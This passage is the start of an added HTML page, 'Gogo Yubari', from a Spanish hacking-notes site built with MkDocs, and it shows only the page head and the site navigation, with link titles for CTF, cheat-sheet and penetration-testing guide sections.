@@ -1,0 +1,3561 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+      
+      
+      
+      
+        <link rel="prev" href="../../3%20Intermedio/Alister/">
+      
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>Gogo Yubari - Secronomicón</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#gogo-yubari" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../../.." title="Secronomicón" class="md-header__button md-logo" aria-label="Secronomicón" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Secronomicón
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Gogo Yubari
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/srrequiem/Secronomicon" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    srrequiem/Secronomicon
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Secronomicón" class="md-nav__button md-logo" aria-label="Secronomicón" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Secronomicón
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/srrequiem/Secronomicon" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    srrequiem/Secronomicon
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Secronomicón
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tags/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Etiquetas | Tags
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../templates/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Templates
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTFs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            CTFs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTFs/HTB%20Cyber%20Apocalypse%202022/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    HTB Cyber Apocalypse 2022
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            HTB Cyber Apocalypse 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../CTFs/IPN%20Core%202022%20CTF/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    IPN Core 2022 CTF
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            IPN Core 2022 CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Cheat Sheets
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Cheat Sheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/fuzzing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fuzzing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/general/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/inyecciones/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Server-Side Template Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferencia de archivos
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_6" id="__nav_5_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_6">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/Network/general/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/Network/pivoting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pivoting &amp; Port Forwarding
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_7" id="__nav_5_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pwning
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_7">
+            <span class="md-nav__icon md-icon"></span>
+            Pwning
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/Pwning/bof-oscp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSCP BOF Cheat Sheet
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Cheat%20Sheets/Pwning/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Pwning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Guías
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Guías
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1">
+            <span class="md-nav__icon md-icon"></span>
+            Active Directory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Gu%C3%ADas/Active%20Directory/0_general/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Teoría General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Gu%C3%ADas/Active%20Directory/1_attacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ataques
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../Gu%C3%ADas/Kali%20Environment/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Kali Environment
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            Kali Environment
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Mobile
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            Mobile
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Gu%C3%ADas/Mobile/General/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Guía Definitiva para Captura de Tráfico
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../Gu%C3%ADas/OSCP%20BOF/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    OSCP BOF
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            OSCP BOF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    TCM Security Academy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5">
+            <span class="md-nav__icon md-icon"></span>
+            TCM Security Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Windows Privilege Escalation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
